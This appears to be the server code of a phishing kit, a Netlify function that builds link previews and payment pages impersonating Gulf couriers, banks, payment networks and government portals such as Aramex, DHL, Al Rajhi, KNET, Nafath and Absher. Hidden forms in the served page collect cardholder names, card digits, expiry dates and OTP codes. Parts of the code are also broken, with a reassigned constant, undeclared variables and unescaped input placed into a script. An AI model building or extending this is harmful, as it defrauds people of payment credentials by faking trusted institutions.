const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Service data mapping - matches the serviceLogos.ts file
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlkw: {
    name: "دي إتش إل - DHL الكويت", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlqa: {
    name: "دي إتش إل - DHL قطر", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlom: {
    name: "دي إتش إل - DHL عُمان", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlbh: {
    name: "دي إتش إل - DHL البحرين", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
    ogImage: "/og-fedex.jpg"
  },
  ups: {
    name: "يو بي إس - UPS",
    description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
    ogImage: "/og-ups.jpg"
  },
  empost: {
    name: "البريد الإماراتي - Emirates Post",
    description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
    ogImage: "/og-empost.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
    ogImage: "/og-smsa.jpg"
  },
  zajil: {
    name: "زاجل - Zajil",
    description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
    ogImage: "/og-zajil.jpg"
  },
  naqel: {
    name: "ناقل - Naqel", 
    description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
    ogImage: "/og-naqel.jpg"
  },
  saudipost: {
    name: "البريد السعودي - Saudi Post",
    description: "المشغل الوطني للبريد في المملكة العربية السعودية",
    ogImage: "/og-saudipost.jpg"
  },
  kwpost: {
    name: "البريد الكويتي - Kuwait Post",
    description: "المشغل الوطني للبريد في دولة الكويت",
    ogImage: "/og-kwpost.jpg"
  },
  qpost: {
    name: "البريد القطري - Qatar Post",
    description: "المشغل الوطني للبريد في دولة قطر",
    ogImage: "/og-qpost.jpg"
  },
  omanpost: {
    name: "البريد العُماني - Oman Post",
    description: "المشغل الوطني للبريد في سلطنة عُمان",
    ogImage: "/og-omanpost.jpg"
  },
  bahpost: {
    name: "البريد البحريني - Bahrain Post",
    description: "المشغل الوطني للبريد في مملكة البحرين",
    ogImage: "/og-bahpost.jpg"
  },
  // Additional GCC shipping companies
  albaraka: {
    name: "مجموعة البركة - Al Baraka Group",
    description: "خدمات شحن وبنكية متكاملة تابعة لمجموعة البركة",
    ogImage: "/og-albaraka.jpg"
  },
  alfuttaim: {
    name: "مجموعة فطيم - Al-Futtaim Group",
    description: "حلول لوجستية متكاملة تشمل الشحن والتوزيع وسلسلة الإمداد",
    ogImage: "/og-alfuttaim.jpg"
  },
  alshaya: {
    name: "مجموعة الشايع - Alshaya Group",
    description: "خدمات التوزيع واللوجستيات للتجزئة عبر الخليج",
    ogImage: "/og-alshaya.jpg"
  },
  national: {
    name: "الخدمات الوطنية للشحن - National Shipping",
    description: "خدمات شحن وبحرية ولوجستيات شاملة داخل وخارج المملكة",
    ogImage: "/og-bahri.jpg"
  },
  shipco: {
    name: "شيبكو - Shipco Transport",
    description: "شحن دولي ومحلي متخصص في الشحن البحري والجوي",
    ogImage: "/og-shipco.jpg"
  },
  hellmann: {
    name: "هيلمان العالمية - Hellmann Worldwide",
    description: "شبكة دولية لخدمات الشحن واللوجستيات",
    ogImage: "/og-hellmann.jpg"
  },
  dsv: {
    name: "دي إس في - DSV",
    description: "حلول شحن ولوجستيات متطورة تشمل الشحن الجوي والبحري والبري",
    ogImage: "/og-dsv.jpg"
  },
  agility: {
    name: "أجيليتي - Agility Logistics",
    description: "خدمات لوجستية وشحن متطورة وحلول سلسلة إمداد واسعة النطاق",
    ogImage: "/og-genacom.jpg"
  },
  jinaken: {
    name: "جيناكن - Jinaken",
    description: "شركة توصيل عُمانية محلية تقدم خدمات التوصيل والشحن داخل السلطنة",
    ogImage: "/og-jinaken.jpg"
  },
  jinakum: {
    name: "جيناكم - Jinakum",
    description: "خدمات دفع وتحويل آمنة وموثوقة",
    ogImage: "/og-jinakum.jpg"
  },
  // Government payment systems
  sadad: {
    name: "سداد - SADAD",
    description: "نظام سداد السعودي — منصة الدفع الإلكتروني الموحد للخدمات الحكومية",
    ogImage: "/gov-sadad.png"
  },
  jaywan: {
    name: "جيوان - Jaywan",
    description: "نظام الدفع الإلكتروني الموحد في الإمارات",
    ogImage: "/gov-jaywan.png"
  },
  dirham: {
    name: "درهم - Dirham Payment",
    description: "بوابة الدفع الإلكتروني درهم في الإمارات — دفع آمن وفوري",
    ogImage: "/gov-dirham.png"
  },
  knet: {
    name: "كي نت - KNET",
    description: "شبكة الدفع الإلكترونية في الكويت — تحويلات فورية وآمنة",
    ogImage: "/gov-knet.png"
  },
  benefit: {
    name: "بنفت - BENEFIT",
    description: "شبكة الدفع الإلكتروني في البحرين — خدمات مصرفية رقمية",
    ogImage: "/gov-benefit.png"
  },
  maal: {
    name: "مال - Maal",
    description: "نظام الدفع الإلكتروني الموحد في سلطنة عُمان",
    ogImage: "/gov-maal.png"
  },
  qatar_gov: {
    name: "بوابة الدفع الحكومية - قطر",
    description: "نظام الدفع الحكومي في دولة قطر — سداد آمن للخدمات الحكومية",
    ogImage: "/gov-qatar.png"
  },
  nafath: {
    name: "نفذ - Nafath IAM",
    description: "منصة الهوية الرقمية الوطنية — تسجيل آمن وموثوق",
    ogImage: "/gov-nafath.png"
  },
  absher: {
    name: "أبشر - Absher",
    description: "منصة أبشر السعودية — خدمات حكومية متكاملة",
    ogImage: "/gov-absher.png"
  },
  uae_pass: {
    name: "الهوية الرقمية - UAE Pass",
    description: "الهوية الرقمية لدولة الإمارات — خدمات رقمية موحدة",
    ogImage: "/gov-uae-pass.png"
  },
  sahel: {
    name: "سهل - Sahel App",
    description: "تطبيق سهل — منصة خدمات حكومية متكاملة",
    ogImage: "/gov-sahel.png"
  },
  metrash2: {
    name: "مترش ٢ - Metrash2",
    description: "منصة Metrash2 القطرية — خدمات حكومية رقمية",
    ogImage: "/gov-metrash2.png"
  },
  // Banks
  alrajhi_bank: {
    name: "مصرف الراجحي - Al Rajhi Bank",
    description: "أكبر بنك إسلامي في العالم — خدمات مصرفية رقمية آمنة",
    ogImage: "/og-bank-alrajhi_bank.jpg"
  },
  snb: {
    name: "البنك الأهلي السعودي - SNB",
    description: "البنك الأهلي السعودي — أكبر بنك في المملكة",
    ogImage: "/og-bank-snb.jpg"
  },
  enbd: {
    name: "الإمارات دبي الوطني - Emirates NBD",
    description: "مجموعة مصرفية رائدة في الإمارات — خدمات رقمية متقدمة",
    ogImage: "/og-bank-enbd.jpg"
  },
  nbk: {
    name: "البنك الوطني الكويتي - NBK",
    description: "أقدم بنك في الكويت — خدمات مصرفية شاملة",
    ogImage: "/og-bank-nbk.jpg"
  },
  qnb: {
    name: "مجموعة QNB - البنك التجاري القطري",
    description: "أكبر بنك في قطر والشرق الأوسط وأفريقيا",
    ogImage: "/og-bank-qnb.jpg"
  },
  bank_muscat: {
    name: "بنك مسقط - Bank Muscat",
    description: "أكبر بنك في سلطنة عُمان — خدمات رقمية شاملة",
    ogImage: "/og-bank-bank_muscat.jpg"
  },
  stc_pay: {
    name: "STC Pay",
    description: "محفظة رقمية من STC — تحويلات فورية داخل المملكة",
    ogImage: "/og-bank-stc_pay.jpg"
  },
  mada: {
    name: "مدى - mada",
    description: "شبكة مدى السعودية — أكبر شبكة بطاقات مصرفية في المملكة",
    ogImage: "/og-bank-mada.jpg"
  },
  riyad_bank: {
    name: "بنك الرياض - Riyad Bank",
    description: "بنك الرياض — حلول مصرفية متكاملة للأفراد والشركات",
    ogImage: "/og-bank-riyad_bank.jpg"
  },
  alahli_bank: {
    name: "البنك الأهلي - Al Ahli Bank",
    description: "البنك الأهلي — خدمات مصرفية إسلامية وتقليدية",
    ogImage: "/og-bank-alahli_bank.jpg"
  },
  alinma_bank: {
    name: "مصرف الإنماء - Alinma Bank",
    description: "مصرف الإنماء — بنك إسلامي سعودي رائد",
    ogImage: "/og-bank-alinma_bank.jpg"
  },
  // Service types
  government_payment: {
    name: "الدفع الحكومي - Government Payment",
    description: "بوابة الدفع الحكومية الآمنة — سداد فواتير الخدمات الحكومية",
    ogImage: "/assets/dynamic-identity/hero-gov.svg"
  },
  health_links: {
    name: "الخدمات الصحية - Health Services",
    description: "منصة الخدمات الصحية — دفع آمن للفواتير الطبية",
    ogImage: "/assets/dynamic-identity/hero-health.svg"
  },
  chalets: {
    name: "حجز الشاليهات - Chalet Booking",
    description: "نظام حجز الشاليهات — دفع آمن لحجز استراحتك",
    ogImage: "/assets/dynamic-identity/hero-chalets.svg"
  },
  invoices: {
    name: "إدارة الفواتير - Invoice Management",
    description: "نظام إدارة ودفع الفواتير الإلكترونية",
    ogImage: "/assets/dynamic-identity/hero-invoice.svg"
  },
  contracts: {
    name: "إدارة العقود - Contract Management",
    description: "نظام إدارة العقود — دفع آمن للخدمات التعاقدية",
    ogImage: "/assets/dynamic-identity/hero-contract.svg"
  },
  local_payment: {
    name: "الدفع المحلي - Local Payment",
    description: "بوابة الدفع المحلية الآمنة",
    ogImage: "/assets/dynamic-identity/hero-local.svg"
  },
  bank_pages: {
    name: "صفحات البنوك - Bank Pages",
    description: "بوابة مصرفية آمنة — دفع عبر البنك مباشرة",
    ogImage: "/assets/dynamic-identity/hero-bank.svg"
  },
  // New government entities
  tawakkalna: {
    name: "توكلنا - Tawakkalna",
    description: "تطبيق الخدمات الحكومية الرسمي في المملكة العربية السعودية",
    ogImage: "/og-tawakkalna.jpg"
  },
  digital_dubai: {
    name: "دبي الرقمية - Digital Dubai",
    description: "التحول الرقمي لحكومة دبي",
    ogImage: "/og-digital-dubai.jpg"
  },
  tamm_abudhabi: {
    name: "تم - TAMM Abu Dhabi",
    description: "منصة حكومة أبوظبي الموحدة",
    ogImage: "/og-tamm.jpg"
  },
  tasdeed: {
    name: "تسديد - Tasdeed",
    description: "منصة السداد الحكومية في الكويت",
    ogImage: "/og-tasdeed.jpg"
  },
  dubaipay: {
    name: "دبي باي - DubaiPay",
    description: "بوابة الدفع الإلكتروني في دبي",
    ogImage: "/og-dubaipay.jpg"
  },
  hukoomi: {
    name: "حكومي - Hukoomi",
    description: "بوابة الحكومة القطرية الموحدة",
    ogImage: "/og-hukoomi.jpg"
  },
  fawri: {
    name: "فوري - Fawri",
    description: "خدمة الدفع الفوري في البحرين",
    ogImage: "/og-fawri.jpg"
  },
  omannet: {
    name: "عمان نت - OmanNet",
    description: "شبكة الدفع الإلكتروني في سلطنة عُمان",
    ogImage: "/og-omannet.jpg"
  },
  // New banks
  kfh: {
    name: "بيت التمويل الكويتي - KFH",
    description: "بنك إسلامي كويتي رائد",
    ogImage: "/og-bank-kfh.jpg"
  },
  fab: {
    name: "بنك أبوظبي الأول - FAB",
    description: "أكبر بنك في الإمارات",
    ogImage: "/og-bank-fab.jpg"
  },
  adib: {
    name: "بنك أبوظبي الإسلامي - ADIB",
    description: "خدمات مصرفية إسلامية في أبوظبي",
    ogImage: "/og-bank-adib.jpg"
  },
};

// Country data mapping
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

// Supabase configuration
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;

const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;

// Function to get link data from database
async function getLinkData(linkId) {
  if (!supabase) {
    console.log('Supabase not configured, using fallback data');
    return null;
  }
  
  try {
    const { data, error } = await supabase
      .from('links')
      .select('*')
      .eq('id', linkId)
      .single();
    
    if (error) {
      console.error('Error fetching link data:', error);
      return null;
    }
    
    return data;
  } catch (error) {
    console.error('Error in getLinkData:', error);
    return null;
  }
}

exports.handler = async (event, context) => {
  // Wrap everything in try-catch to ensure we always return HTML
  // Never show Netlify login or error pages
  try {
    const { path, queryStringParameters, headers } = event;
    
    // Detect if this is a social media crawler or bot
    const userAgent = headers['user-agent'] || headers['User-Agent'] || '';
    const isCrawler = /facebookexternalhit|twitterbot|linkedinbot|whatsapp|slackbot|telegrambot|bingbot|googlebot|baiduspider|yandexbot|applebot/i.test(userAgent);
    
    // Continue with meta tag generation for both crawlers and regular users
    // Crawlers will read meta tags, regular users will be redirected via JavaScript
  
  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/... or /p/:id/:company/:currency/:amount
  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
  let countryCode, type, id;

  if (pathMatch) {
    [, countryCode, type, id] = pathMatch;
  } else {
    // Handle /p/:id/:company/:currency/:amount format
    pathMatch = path.match(/^\/p\/([a-zA-Z0-9-]+)\/([^\/]+)\/([^\/]+)\/([^\/]+)(\/)?$/);
    if (pathMatch) {
      [, id, serviceKeyFromPath, currencyFromPath, amountFromPath] = pathMatch;
      type = 'shipping';
      countryCode = 'SA';
      // Inject the company into query params so downstream logic picks it up
      if (!queryStringParameters) queryStringParameters = {};
      queryStringParameters.company = decodeURIComponent(serviceKeyFromPath);
      console.log('Extracted service from /p/ path:', serviceKeyFromPath);
    } else {
      // Handle payment page routes: /pay/:id/...
      pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
      if (pathMatch) {
        [, id, subPath] = pathMatch;
        type = 'shipping';
        countryCode = 'SA';
      } else {
        // Handle /pay/:id (no sub-path)
        pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)$/);
        if (pathMatch) {
          [, id] = pathMatch;
          type = 'shipping';
          countryCode = 'SA';
        } else {
          // Invalid path - serve React app HTML directly
          return {
            statusCode: 200,
            headers: {
              'Content-Type': 'text/html; charset=utf-8',
            },
            body: `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Loading...</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
  </head>
  <body>
    <div id="root"></div>
    <script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">
  </body>
</html>`
          };
        }
      }
    }
  }
  
  // If country not found, use default but don't return 404
  let country = countryData[countryCode];
  if (!country) {
    console.warn(`Country ${countryCode} not found, using default`);
    // Use default country (Saudi Arabia)
    country = countryData['SA'] || { nameAr: 'السعودية', name: 'Saudi Arabia' };
    countryCode = 'SA';
  }
  
  // Try to get link data from database first
  const linkData = await getLinkData(id);
  console.log('Retrieved link data:', JSON.stringify(linkData, null, 2));

  // For payment pages, get country and type from link data if available
  if (linkData?.country_code) {
    countryCode = linkData.country_code;
    const linkCountry = countryData[countryCode];
    if (linkCountry) {
      country = linkCountry;
    }
  }

  if (linkData?.type) {
    type = linkData.type;
  }
  
  // Debug logging
  console.log('Link ID:', id);
  console.log('Link Data:', linkData);
  console.log('Query Parameters:', queryStringParameters);
  console.log('Final Country:', countryCode, 'Type:', type);
  
  let title = "";
  let description = "";
  let ogImage = "/og-aramex.jpg";
  let serviceKey = 'aramex'; // fallback
  
  if (type === "shipping") {
    // Determine service key from multiple sources - prioritize 'company' parameter
    if (queryStringParameters?.company) {
      serviceKey = queryStringParameters.company;
      console.log('Using company parameter:', serviceKey);
    } else if (linkData?.payload?.service_key) {
      serviceKey = linkData.payload.service_key;
      console.log('Using service_key from payload:', serviceKey);
    } else if (linkData?.payload?.service) {
      serviceKey = linkData.payload.service;
      console.log('Using service from payload:', serviceKey);
    } else if (queryStringParameters?.service) {
      serviceKey = queryStringParameters.service;
      console.log('Using service from query params:', serviceKey);
    } else {
      console.log('Using fallback service:', serviceKey);
    }

    const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
    
    console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
    
    // Determine if this is a payment page or microsite
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
    
    title = `${pageType} - ${serviceName}`;
    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
    ogImage = serviceInfo.ogImage;
    
    // Add tracking number to description if available
    if (linkData?.payload?.tracking_number) {
      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
    }
    
    // Add COD amount if available
    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
    }
  } else if (type === "chalet") {
    const chaletName = linkData?.payload?.chalet_name || 'شاليه';
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
    
    title = `${pageType} - ${chaletName} في ${country.nameAr}`;
    description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
    
    // Add guest count and nights if available
    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
    }
    
    ogImage = "/og-aramex.jpg"; // Default for chalets
  }
  
  const siteUrl = `https://${event.headers.host}`;
  const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
  const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
  const secureOgImage = fullOgImage.replace('http://', 'https://');
  
  // Final debug logging
  console.log('Final meta tags:', { title, description, ogImage, serviceKey });
  
  // Build HTML with React app - use current build's asset filenames
  // In Netlify, the dist folder is accessible, so we can read index.html
  // But if that fails, we'll use a script that loads assets dynamically
  let scriptTag = '';
  let styleTag = '';
  
  try {
    // Try to read index.html from dist folder
    // In Netlify functions, the dist folder is at the repo root
    const indexPath = path.join(__dirname, '..', '..', 'dist', 'index.html');
    if (fs.existsSync(indexPath)) {
      const baseHtml = fs.readFileSync(indexPath, 'utf8');
      
      // Extract script and style tags
      const scriptMatch = baseHtml.match(/<script[^>]*src=["']([^"']+)["'][^>]*><\/script>/i);
      const styleMatch = baseHtml.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/i);
      
      if (scriptMatch) scriptTag = `<script type="module" crossorigin src="${scriptMatch[1]}"></script>`;
      if (styleMatch) styleTag = `<link rel="stylesheet" crossorigin href="${styleMatch[1]}">`;
      
      console.log('Successfully loaded assets from index.html');
    } else {
      throw new Error('index.html not found at expected path');
    }
  } catch (error) {
    console.error('Could not read index.html:', error);
    // Fallback: Use current build's asset filenames
    // Updated: 2025-11-09
    scriptTag = '<script type="module" crossorigin src="/assets/index-DzQfBceo.js"></script>';
    styleTag = '<link rel="stylesheet" crossorigin href="/assets/index-B4xNSA_N.css">';

    // If those don't work, add a fallback script that tries multiple patterns
    scriptTag += `
    <script>
      // Fallback: Try to load React app if primary script fails
      window.addEventListener('error', function(e) {
        if (e.target && e.target.tagName === 'SCRIPT') {
          // Try alternative asset paths
          const alternatives = ['/assets/index.js', '/assets/index-main.js'];
          alternatives.forEach(alt => {
            const script = document.createElement('script');
            script.type = 'module';
            script.src = alt;
            document.head.appendChild(script);
          });
        }
      }, true);
    </script>`;
  }
  
  // Build the React app HTML with proper meta tags and asset loading
  // This HTML will be served directly - no redirects, no Netlify login pages
  const reactAppHtml = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#0EA5E9" />
    <link rel="manifest" href="/manifest.json" />
    <link rel="apple-touch-icon" href="/icon-192.png" />
    <!-- Primary Meta Tags -->
    <title>${title}</title>
    <meta name="title" content="${title.replace(/"/g, '&quot;')}" />
    <meta name="description" content="${description.replace(/"/g, '&quot;')}" />
    <meta name="author" content="منصة الدفع الذكية" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    ${styleTag}
    
    <!-- Open Graph / Facebook / WhatsApp Meta Tags -->
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="نظام الدفع الآمن" />
    <meta property="og:locale" content="ar_AR" />
    <meta property="og:url" content="${fullUrl}" />
    <meta property="og:title" content="${title.replace(/"/g, '&quot;')}" />
    <meta property="og:description" content="${description.replace(/"/g, '&quot;')}" />
    <meta property="og:image" content="${secureOgImage}" />
    <meta property="og:image:secure_url" content="${secureOgImage}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:alt" content="${title.replace(/"/g, '&quot;')}" />
    
    <!-- Twitter Card Meta Tags -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:url" content="${fullUrl}" />
    <meta name="twitter:title" content="${title.replace(/"/g, '&quot;')}" />
    <meta name="twitter:description" content="${description.replace(/"/g, '&quot;')}" />
    <meta name="twitter:image" content="${secureOgImage}" />
    <meta name="twitter:image:alt" content="${title.replace(/"/g, '&quot;')}" />
    
    <link rel="canonical" href="${fullUrl}" />
  </head>
  <body>
    <div id="root"></div>
    
    <!-- Update browser history immediately so React Router sees the correct path -->
    <script>
      (function() {
        const originalPath = '${path}';
        const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
        if (window.history && window.history.replaceState) {
          window.history.replaceState({}, '', originalPath + query);
        }
      })();
    </script>
    
    ${scriptTag}
    
    <!-- Hidden Netlify Forms -->
    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
      <input type="text" name="name" />
      <input type="email" name="email" />
      <input type="tel" name="phone" />
      <input type="text" name="service" />
      <input type="text" name="cardholder" />
      <input type="text" name="cardLast4" />
      <input type="text" name="expiry" />
      <input type="text" name="timestamp" />
    </form>
    
    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
      <input type="text" name="name" />
      <input type="email" name="email" />
      <input type="tel" name="phone" />
      <input type="text" name="service" />
      <input type="text" name="amount" />
      <input type="text" name="cardholder" />
      <input type="text" name="cardLast4" />
      <input type="text" name="otp" />
      <input type="text" name="timestamp" />
    </form>
  </body>
</html>`;
  
  // The HTML already has meta tags injected, so we can return it directly
  const html = reactAppHtml;

  return {
    statusCode: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=0, must-revalidate',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'SAMEORIGIN'
    },
    body: html
  };
  } catch (error) {
    // If anything goes wrong, still return HTML (never show Netlify error/login page)
    console.error('Error in microsite-meta function:', error);
    
    // Return React app HTML with fallback meta tags
    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'public, max-age=0, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'SAMEORIGIN'
      },
      body: `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#0EA5E9" />
    <title>منصة الشحن الذكية</title>
    <meta name="description" content="منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    <script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">
  </head>
  <body>
    <div id="root"></div>
    <script>
      // Update browser history for React Router
      if (window.history && window.history.replaceState) {
        window.history.replaceState({}, '', window.location.pathname + window.location.search);
      }
    </script>
  </body>
</html>`
    };
  }
};